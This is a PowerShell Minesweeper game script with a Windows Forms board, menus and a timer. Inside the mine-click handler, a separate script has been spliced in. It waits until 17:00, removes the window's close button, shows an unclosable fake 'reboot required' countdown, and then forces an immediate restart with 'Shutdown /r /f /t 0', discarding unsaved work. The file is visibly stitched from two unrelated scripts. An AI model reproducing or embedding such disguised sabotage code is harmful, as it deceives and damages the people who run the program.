# MineSweeper.ps1
# Markus Scholtes, 2016
# Minesweeper game based on the game of mow: http://mow001.blogspot.com/2005/11/msh-minesweeper-gui-game.html

# load Windows Forms assembly
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null

function Game([INT]$SIZE)
{
	# Level parameters:
	switch($SIZE)
	{
	# very small
	1 { $ROWS = 5
			$COLS = 5
			$MINES = 4
		}
	# small
	2 {	$ROWS = 9
			$COLS = 9
			$MINES = 10
		}
	# medium
	3	{	$ROWS = 16
			$COLS = 16
			$MINES = 40
		}
	# large
	4	{	$ROWS = 25
			$COLS = 30
			$MINES = 99
		}
	}

	$SCRIPT:RETURNVALUE = 0

	# Create Form
	$FORM = New-Object System.Windows.Forms.Form
	# Configure Form
	$FORM.Text = "MineSweeper"
	# Load icon
	# Base64 string generated with [CONVERT]::ToBase64String((Get-Content '.\Icon.ico' -Encoding BYTE))
	$FORM.Icon = [System.Convert]::FromBase64String('
AAABAAEAICAAAAEACACoCAAAFgAAACgAAAAgAAAAQAAAAAEACAAAAAAAAAAAAGAAAABgAAAAAAEAAAAAAAAAAP//OgD//wA6//9mAP//AGb//5A6//+QZv/
/tmb//zqQ//9mtv//25D//9u2////tv//kNv//7b////b2////9v//9v/////////AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/w
AAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AA
AD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA
/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8
AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AA
AA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAA
P8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/
AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wA
AAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAA
D/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/
wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8A
AAD/AAAA/wAAAP8AAAD/EhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEh
ISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhIPDxISEhISEhISDgAAAAwSEgkAAAAAAAoSE
hISEhIEAAAKEhISEhISEhINAAAFEhIIAAAHEhIIAAMSEhISEgQAAAwSEhISEhISEg0AAAcSEgQABRISEhIIAAUSEhISCQAADBISEhISEhISDQAABxISCQAK
EhISEg0AAAwSEhINAAAKEhIIAAADEhINAAAFEhISEhISEhISCAAADBISEhECAAUSCQAAAAABEA4AAAUSEhISEhISEg0AAAEQEhISEgQAAw4AAAALAgAFDgA
AAxISEhISEhINAAAABxISEhISCQAAAAAABxIOAAAGAgABEBISEhISDQAAAAUSEhISEhIOAAAAAAAMEhINAAAAAAEQEhISEg0AAAAFEhISEhISEhECAAAABR
ISEhIEAAAAAAwSEhIRAgAABxISEhISEhISEggAAAAKEhISEg4AAAAAChISEg0AAAUSEhISEhISEhISCQAAARASEhISEggAAAAKEhISDQAAChISEhISEhISE
hINAAAFEhISEhISDgAAAAcSEhIOAAAHEhISDw8SEhISEggAAAcSEhISEhISBAAABRISEhINAAAKEg0AARASEhIRAgAADBISEhISEhIIAAAFEhISEhIRAgAA
AAAFEhISEgkAAAMSEhISEhISEhISEhISEhISEhISEhISEhISEhISCQAAChISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEh
ISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISE
hISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAA')

	# Formular has to be wide enough for the status bar
	if ((($COLS * 25) + 16) -lt 147)
	{ $FORM.Width = 147 }
	else
	{ $FORM.Width = ($COLS * 25) + 16 }
	$FORM.Height = ($ROWS * 25) + 85

	# Build menu bar
	$MS = New-Object System.Windows.Forms.MenuStrip

	# Menu "File"
	$MI = New-Object System.Windows.Forms.ToolStripMenuItem("&File")
	$MSI = New-Object System.Windows.Forms.ToolStripMenuItem("&Close")
	# activate with Alt-X
	$MSI.ShortcutKeys = [System.Windows.Forms.Keys]::Alt -bor [System.Windows.Forms.Keys]::X
	$MSI.add_Click({ $FORM.Close() })
	[void]$MI.DropDownItems.Add($MSI)
	[void]$MS.Items.Add($MI)

	# Menu "Game"
	$MI = New-Object System.Windows.Forms.ToolStripMenuItem("&Game")
	$MSI = New-Object System.Windows.Forms.ToolStripMenuItem("&Very small")
	# activate with Alt-1
	$MSI.ShortcutKeys = [System.Windows.Forms.Keys]::Alt -bor [System.Windows.Forms.Keys]::"D1"
	if ($SIZE -eq 1) { $MSI.Checked = $TRUE }
	$MSI.add_Click({ $SCRIPT:RETURNVALUE = 1; $FORM.Close() })
	[void]$MI.DropDownItems.Add($MSI)
	$MSI = New-Object System.Windows.Forms.ToolStripMenuItem("&Small")
	# activate with Alt-2
	$MSI.ShortcutKeys = [System.Windows.Forms.Keys]::Alt -bor [System.Windows.Forms.Keys]::"D2"
	if ($SIZE -eq 2) { $MSI.Checked = $TRUE }
	$MSI.add_Click({ $SCRIPT:RETURNVALUE = 2; $FORM.Close() })
	[void]$MI.DropDownItems.Add($MSI)
	$MSI = New-Object System.Windows.Forms.ToolStripMenuItem("&Medium")
	# activate with Alt-3
	$MSI.ShortcutKeys = [System.Windows.Forms.Keys]::Alt -bor [System.Windows.Forms.Keys]::"D3"
	if ($SIZE -eq 3) { $MSI.Checked = $TRUE }
	$MSI.add_Click({ $SCRIPT:RETURNVALUE = 3; $FORM.Close() })
	[void]$MI.DropDownItems.Add($MSI)
	$MSI = New-Object System.Windows.Forms.ToolStripMenuItem("&Large")
	# activate with Alt-4
	$MSI.ShortcutKeys = [System.Windows.Forms.Keys]::Alt -bor [System.Windows.Forms.Keys]::"D4"
	if ($SIZE -eq 4) { $MSI.Checked = $TRUE }
	$MSI.add_Click({ $SCRIPT:RETURNVALUE = 4; $FORM.Close() })
	[void]$MI.DropDownItems.Add($MSI)
	[void]$MS.Items.Add($MI)

	# Menu "?"
	$MI = New-Object System.Windows.Forms.ToolStripMenuItem("&?")
	$MSI = New-Object System.Windows.Forms.ToolStripMenuItem("&Information")
	# activate with F1
	$MSI.ShortcutKeys = [System.Windows.Forms.Keys]::F1
	$MSI.add_Click({ [System.Windows.Forms.MessageBox]::Show("Powershell Minesweeper 2016`n`nBy Markus Scholtes based on a script by /\/\o\/\/", "Information") })
	[void]$MI.DropDownItems.Add($MSI)
	[void]$MS.Items.Add($MI)

	# Add menu bar to form
	$FORM.Controls.Add($MS)

	# Create status bar
	$STATUSSTRIP = New-Object System.Windows.Forms.StatusStrip
	# Add range for time counter
	$TIMEFIELD = New-Object System.Windows.Forms.ToolStripStatusLabel
	$TIMEFIELD.Text = "00:00"
	$TIMEFIELD.Font = New-Object System.Drawing.Font([System.Drawing.Fontfamily]'Arial', 10, [System.Drawing.FontStyle]'Regular')
	[VOID]$STATUSSTRIP.Items.Add($TIMEFIELD)

	# Add range for mine counter
	$SCRIPT:MINECOUNTER = $MINES
	$SCRIPT:FIELDCOUNTER = 0
	$MINECOUNT = New-Object System.Windows.Forms.ToolStripStatusLabel
	$MINECOUNT.Text = "   Mines: " + $SCRIPT:MINECOUNTER
	$MINECOUNT.Font = New-Object System.Drawing.Font([System.Drawing.Fontfamily]'Arial', 10, [System.Drawing.FontStyle]'Regular')
	[VOID]$STATUSSTRIP.Items.Add($MINECOUNT)

	# Add to window
	$FORM.Controls.Add($STATUSSTRIP)

	# Create timer
	$TIMER = New-Object System.Windows.Forms.Timer
	$TIMER.Interval = 1000
	$SCRIPT:SECONDS = 0
	# Timerfunktion
	$TIMER.add_Tick({
		$SCRIPT:SECONDS +=1
		$TIMEFIELD.Text = (New-Timespan -Seconds $SCRIPT:SECONDS).ToString().SubString(3)
	})
	# Activate timer
	$TIMER.Enabled = $True
	$TIMER.Start()

	# Container for buttons that build the game field
	[System.Windows.Forms.Control[]]$MAP = @()

	# Clear field (function for left mouse button)
	function DoClear([INT]$NUM)
	{
	  $C = $NUM % $COLS
	  $R = [Math]::Truncate($NUM/$COLS)
	  if ($MAP[$NUM].Enabled -eq $TRUE)
	  {
	    $MAP[$NUM].Enabled = $FALSE
	    if ($MAP[$NUM].Tag -eq "X")
	    {	# clicked on mine
         # Waits until given time before continuing
$Wait = (New-TimeSpan -End 17:00).TotalSeconds

If ($Wait -gt 0)
{
    Sleep -Seconds $Wait
} 

# Countdown for the reboot that the user will see
$RebootT = 300
$RebootM = $RebootT/60

# Message for the user so they are aware the system will be rebooting
$Message = "A reboot is required on this system, please save all work. Your system will reboot in $RebootM minutes."

# This removes the use of the close "x" button on the pop-up countodwn box the users will see
$code = @'
using System;
using System.Runtime.InteropServices;

namespace CloseButtonToggle {
  internal static class WinAPI {
    [DllImport("kernel32.dll")]
    internal static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool DeleteMenu(IntPtr hMenu,
                           uint uPosition, uint uFlags);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool DrawMenuBar(IntPtr hWnd);

    [DllImport("user32.dll")]
    internal static extern IntPtr GetSystemMenu(IntPtr hWnd,
               [MarshalAs(UnmanagedType.Bool)]bool bRevert);

    const uint SC_CLOSE     = 0xf060;
    const uint MF_BYCOMMAND = 0;

    internal static void ChangeCurrentState(bool state) {
      IntPtr hMenu = GetSystemMenu(GetConsoleWindow(), state);
      DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
      DrawMenuBar(GetConsoleWindow());
    }
  }

  public static class Status {
    public static void Disable() {
      WinAPI.ChangeCurrentState(false); //its 'true' if need to enable
    }
  }
}
'@

Add-Type $code
[CloseButtonToggle.Status]::Disable()

Add-Type -assembly System.Windows.Forms

$Title = "PowerShell Countdown"
$height = 150
$width = 400
$color = "White"

#Create the form for the countdown box
$form1 = New-Object System.Windows.Forms.Form
$form1.Text = $title
$form1.Height = $height
$form1.Width = $width
$form1.BackColor = $color

$form1.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle 
$form1.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen

$label1 = New-Object system.Windows.Forms.Label
$label1.Text = "Not started"
$label1.Left = 10
$label1.Top = 70
$label1.Width= $width - 20
$label1.Height = 15
$label1.Font = "Verdana"

$form1.controls.add($label1)

$label2 = New-Object system.Windows.Forms.Label
$label2.Text = $Message
$label2.Left = 10
$label2.Top = 10
$label2.Width= $width - 40
$label2.Height = 70
$label2.Font = "Verdana"

$form1.controls.add($label2)

$progressBar1 = New-Object System.Windows.Forms.ProgressBar
$progressBar1.Name = 'progressBar1'
$progressBar1.Value = 0
#$progressBar1.Style = "Continuous"
$System_Drawing_Size = New-Object System.Drawing.Size
$System_Drawing_Size.Width = $width - 40
$System_Drawing_Size.Height = 15
$progressBar1.Size = $System_Drawing_Size
$progressBar1.Left = 10
$progressBar1.Top = 90

$form1.Controls.Add($progressBar1)

$form1.Show()| Out-Null

$form1.Focus() | Out-Null

$form1.Refresh()

$Seconds = 1..$RebootT

$i = 0

# The countdown timer
ForEach ($Sec in $Seconds)
{
    $i++
    [int]$pct = ($i/$Seconds.Count)*100
    $SecLeft = $Seconds.Count - $i
    $Min = [Int](([String]($SecLeft/60)).split('.')[0])
    $progressbar1.Value = $pct
    $label1.text = "$Min" + " minutes " + ($SecLeft % 60) + " seconds left until reboot..."
    $form1.Refresh()

    Start-Sleep -Seconds 1
}

$form1.Close()

Shutdown /r /f /t 0 
	    }
	    else
	    { # clicked on empty field
	      $MAP[$NUM].Text = ""
	      $MAP[$NUM].BackColor = "DarkGray"
	      $MAP[$NUM].FlatStyle = 'Flat'

				$SCRIPT:FIELDCOUNTER += 1
				# are all empty fields open?
				if (($SCRIPT:FIELDCOUNTER + $MINES) -eq ($ROWS * $COLS))
				{ # Game won
					$TIMER.Enabled = $FALSE
		      for ($i = 0; $i -lt $MAP.Count; $i++)
		      { # disable all buttons
		   			$MAP[$i].Enabled = $FALSE
		   			if ($MAP[$i].Tag -eq "X")
		     		{	# and show mines in "winner colour"
		     			$MAP[$i].Text = "X"
		     			$MAP[$i].BackColor = "LightGreen"
		     		}
		      }
				}

	      if ($MAP[$NUM].Tag -ne 0)
	      { # Show count of neighbor mines
	        $MAP[$NUM].Text = $MAP[$NUM].Tag
	      }
	      else
	      { # no neighbor mine, call function recursive for neighbor fields
	        if ($C -gt 0)
	        {
	          doClear ($NUM - 1)
	          if ($R -gt 0)
	          { doClear ($NUM - $COLS - 1) }
	        }

	        if ($C -lt ($COLS - 1))
	        {
	          doClear ($NUM + 1)
	          if ($R -gt 0)
	          { doClear ($NUM - $COLS + 1) }
	        }

	        if ($R -gt 0)
	        { doClear ($NUM - $COLS) }

	        if ($R -lt ($ROWS -1))
	        {
	          doClear ($NUM + $COLS)
	          if ($C -gt 0)
	          { doClear ($NUM + $COLS - 1) }
	          if ($C -lt ($COLS - 1))
	          { doClear ($NUM + $COLS + 1) }
	        }
	      }
	    }
	  }
	}

	# Mark field (function for right mouse button)
	function DoMark([INT]$NUM)
	{
	  if ($MAP[$NUM].Enabled -eq $true)
	  { # First click: mine symbol
	    if ($MAP[$NUM].Text -eq "")
	    {
	    	$MAP[$NUM].Text = "O"
	    	$SCRIPT:MINECOUNTER -= 1
	    	$MINECOUNT.Text = "  Mines: " + $SCRIPT:MINECOUNTER
			}
	    else
	    { # Second click: question mark
	    	if ($MAP[$NUM].Text -eq "O")
	    	{
	    		$MAP[$NUM].Text = "?"
	    		$SCRIPT:MINECOUNTER += 1
		    	$MINECOUNT.Text = "  Mines: " + $SCRIPT:MINECOUNTER
	    	}
	    	else
	    	# Third click: clear mark
	      { $MAP[$NUM].Text = "" }
			}
		}
	}

	# Generate game field (the mine field)(as an array of buttons)
	for ($i = 0; $i -lt $ROWS; $i++)
	{
	  $ROW = @()
	  for ($j = 0; $j -lt $COLS; $j++)
	  {
	    $BUTTON = New-Object System.Windows.Forms.Button
	    $BUTTON.Width = 25
	    $BUTTON.Height = 25
	    $BUTTON.Top = ($i * 25) + 25
	    $BUTTON.Left = $j * 25
	    $BUTTON.Name = ($i * $COLS) + $j
	    $BUTTON.Tag = "0"
	    # function for left mouse click
	    $BUTTON.add_click({
	      [int]$NUM = $this.Name
	      DoClear $NUM
	    })

	    # function for right mouse click
			$BUTTON.add_MouseUp({
				# only when right button is clicked
				if ($_.Button -eq [Windows.Forms.MouseButtons]::Right)
				{
	      	[int]$NUM = $this.Name
	      	DoMark $NUM
	      }
			})

	    $BUTTON.Font = New-Object System.Drawing.Font([System.Drawing.Fontfamily]'Microsoft Sans Serif', 10, [System.Drawing.FontStyle]'Bold')
	    $ROW += $BUTTON
	  }

	  $MAP += $ROW
	}

	# Raise counter "neighbor mines" for a field
	function DoRaise([INT]$CELL)
	{
	  if ($MAP[$CELL].Tag -ne "X")
	  {
	    $n = [int]$MAP[$CELL].Tag
	    $n += 1
	    $MAP[$CELL].Tag = $n
	  }
	}

	# "Throw" chosen count of mines
	$RANDOM = New-Object System.Random([Datetime]::Now.Millisecond)
	for ($i = 0; $i -lt $MINES)
	{
	  $NUM = $RANDOM.Next($MAP.Count)

	  # only when there is no mine already
	  if ($MAP[$NUM].Tag -ne "X")
	  { # Mark field with mine
	    $MAP[$NUM].Tag = "X"
	    $C = $NUM % $COLS
	    $R = [Math]::Truncate($NUM/$COLS)

	    # Raise mine counter of neighbor fields
	    if ($C -gt 0)
	    {
	      doRaise ($NUM - 1)
	      if ($R -gt 0)
	      {	doRaise ($NUM - $COLS - 1) }
	    }
	    if ($C -lt ($COLS - 1))
	    {
	      doRaise ($NUM + 1)
	      if ($R -gt 0)
	      { doRaise ($NUM - $COLS + 1) }
	    }
	    if ($R -gt 0)
	    { doRaise ($NUM - $COLS) }
	    if ($R -lt ($ROWS -1))
	    {
	      doRaise ($NUM + $COLS)
	      if ($C -gt 0)
	      { doRaise ($NUM + $COLS - 1) }
	      if ($C -lt ($COLS -1))
	      { doRaise ($NUM + $COLS + 1) }
	    }

	    $i++
	  }
	}

	# Add game field (array of buttons) to form
	$FORM.Controls.AddRange($MAP)

	# Show form (with elimination of powershell V2 winforms activation problem)
	$FORM.Add_Shown( { $FORM.Activate(); } )
	[void]$FORM.ShowDialog()
	$TIMER.Enabled = $FALSE
	$SCRIPT:RETURNVALUE
}

$EXITCODE = 2
do
{
	$EXITCODE = Game $EXITCODE
} while ($EXITCODE -ne 0)
